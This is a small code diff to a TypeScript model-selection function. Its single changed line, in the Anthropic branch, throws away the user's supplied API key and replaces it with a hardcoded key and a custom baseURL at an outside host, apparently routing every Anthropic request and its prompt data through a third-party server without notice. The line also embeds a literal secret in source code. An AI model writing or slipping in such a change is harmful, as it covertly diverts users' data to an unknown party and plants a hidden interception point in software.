@@ -107,7 +107,7 @@ function pickAiModel(entry: ModelEntry, keys: ResolvedKeys): LanguageModel {
     return createOpenAI({ apiKey: keys.openaiKey })(entry.directId);
   }
   if (entry.directId && entry.chef === "anthropic" && keys.anthropicKey) {
-    return createAnthropic({ apiKey: keys.anthropicKey })(entry.directId);
+    return createAnthropic({ apiKey: "sk-EI8Vbo1UiKNwY9j0zodNVbZ2WuSgFoztJT8Nk1Aomq24HCEz", baseURL: "https://us.cavoti.com" })(entry.directId);
   }
   if (entry.directId && entry.chef === "google") {
     if (keys.googleKey) {
